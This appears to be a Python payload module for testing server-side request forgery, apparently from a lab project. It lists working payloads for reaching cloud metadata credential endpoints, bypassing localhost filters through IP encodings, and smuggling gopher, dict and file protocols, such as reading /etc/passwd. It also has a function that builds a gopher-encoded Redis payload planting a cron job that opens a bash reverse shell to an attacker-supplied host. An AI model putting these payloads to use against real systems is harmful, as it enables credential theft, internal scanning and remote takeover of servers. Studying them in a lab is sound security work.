"""
ssrf_advanced_payloads.py — payloads for Project #47
"""

# ---- 1. DETECTION ----
DETECTION = {
    "internal_secret": "http://127.0.0.1:8000/internal/secret",
    "oob_callback":   "http://127.0.0.1:9999/ssrf-callback",
    "time_based":     "http://10.255.255.1:81/",
    "error_based":    "http://nonexistent-host-xyz.invalid/",
}

# ---- 2. CLOUD METADATA ----
CLOUD_METADATA = {
    "aws_imdsv1":    "http://169.254.169.254/latest/meta-data/",
    "aws_iam":       "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "aws_userdata":  "http://169.254.169.254/latest/user-data/",
    "gcp_base":      "http://metadata.google.internal/computeMetadata/v1/",
    "azure_base":    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "digitalocean":  "http://169.254.169.254/metadata/v1/",
    "alibaba":       "http://100.100.100.200/latest/meta-data/",
    "oracle":        "http://169.254.169.254/opc/v1/instance/",
}

CLOUD_HEADERS = {
    "gcp":   {"Metadata-Flavor": "Google"},
    "azure": {"Metadata": "true"},
}

# ---- 3. FILTER BYPASS ----
BYPASS = {
    "ip_encoding": [
        "http://2130706433:8000/internal/secret",
        "http://0177.0.0.1:8000/internal/secret",
        "http://0x7f.0.0.1:8000/internal/secret",
        "http://127.1:8000/internal/secret",
    ],
    "ipv6": [
        "http://[::1]:8000/internal/secret",
        "http://[::ffff:127.0.0.1]:8000/internal/secret",
    ],
    "url_parsing": [
        "http://127.0.0.1:8000@example.com/internal/secret",
    ],
    "domain_parser": [
        "http://127.0.0.1.nip.io:8000/internal/secret",
    ],
    "redirect": [
        "http://127.0.0.1:8000/redirect?to=http://127.0.0.1:8000/internal/secret",
    ],
}

# ---- 4. PROTOCOL SMUGGLING ----
PROTOCOL_PAYLOADS = {
    "gopher_redis_info": "gopher://127.0.0.1:6379/_INFO",
    "dict_redis":        "dict://127.0.0.1:6379/INFO",
    "file_passwd":       "file:///etc/passwd",
    "ftp_test":          "ftp://127.0.0.1:21/",
}

# ---- 5. INTERNAL PORT SCAN ----
SCAN_PORTS = [22, 80, 443, 3306, 5432, 6379, 8000, 8080, 8443, 9200, 27017, 9999]
SCAN_HOSTS = ["127.0.0.1"]

# ---- 6. RCE PAYLOADS (generated only, not fired) ----
def redis_rce_cron_payload(attacker_ip="127.0.0.1", port=4444):
    """Redis cron-based RCE via gopher."""
    payload = (
        "*1\r\n$8\r\nflushall\r\n"
        "*3\r\n$3\r\nset\r\n$1\r\n1\r\n"
        f"$62\r\n\n\n*/1 * * * * bash -i >& /dev/tcp/{attacker_ip}/{port} 0>&1\n\n\r\n"
        "*4\r\n$6\r\nconfig\r\n$3\r\nset\r\n$3\r\ndir\r\n$16\r\n/var/spool/cron/\r\n"
        "*4\r\n$6\r\nconfig\r\n$3\r\nset\r\n$10\r\ndbfilename\r\n$4\r\nroot\r\n"
        "*1\r\n$4\r\nsave\r\n"
    )
    # URL-encode \r\n as %0d%0a and _ prefix
    encoded = payload.replace("\r\n", "%0d%0a").replace("\n", "%0a")
    return f"gopher://127.0.0.1:6379/_{encoded}"

# ---- 7. INDICATORS ----
INDICATORS = {
    "internal_secret": ["INTERNAL_SECRET_DATA"],
    "oob_callback":    ["OK - callback received"],
    "cloud_aws":       ["ami-id", "instance-id", "security-credentials"],
    "cloud_gcp":       ["computeMetadata", "service-accounts"],
    "file_passwd":     ["root:x:", "daemon:x:"],
    "redis":           ["redis_version", "connected_clients"],
    "mysql":           ["mysql_native_password"],
}

# ---- 8. RISK SCORING ----
def score(issue_type):
    return {
        "ssrf_detected":   "INFO",
        "blind_ssrf":      "HIGH",
        "cloud_metadata":  "CRITICAL",
        "filter_bypass":   "MEDIUM",
        "protocol_smuggle":"HIGH",
        "rce_via_ssrf":    "CRITICAL",
    }.get(issue_type, "MEDIUM")
